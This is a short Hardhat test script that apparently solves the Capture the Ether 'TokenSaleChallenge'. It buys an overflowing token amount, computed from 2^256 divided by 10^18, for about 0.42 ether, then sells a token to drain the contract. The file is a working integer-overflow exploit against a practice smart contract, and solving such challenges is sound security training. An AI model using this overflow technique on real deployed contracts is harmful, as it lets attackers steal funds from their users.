const { expect } = require("chai");
const { assert } = require("console");
const { ethers } = require("hardhat");
// require("@nomicfoundation/hardhat-chai-matchers");


let accounts;
let acc;
let game; 
let maxT
let price
before(async () => {
  accounts = await ethers.getSigners();
  acc = accounts[0];
  game = await ethers.getContractFactory("TokenSaleChallenge")
      .then((factory) => factory.deploy(acc.address, { value: ethers.utils.parseEther("1") }));
  maxT = ethers.BigNumber.from("115792089237316195423570985008687907853269984665640564039458")         // ((2 ** 256 - 1) / (10 ** 18)) + 1
  price = ethers.BigNumber.from("415992086870360064")
});

it("sells tokens", async function () {
  // console.log("sale:", game.address)
  // console.log("max ", maxT.toString())
  const tx = await game.buy(maxT, { value: price })
  await tx.wait()
  // console.log("balance:", await game.balanceOf(acc.address))

  const sell = await game.sell(1)
  await sell.wait()
  console.log("SC balance:", await ethers.provider.getBalance(game.address))

  expect(await game.isComplete()).to.be.true
});

 
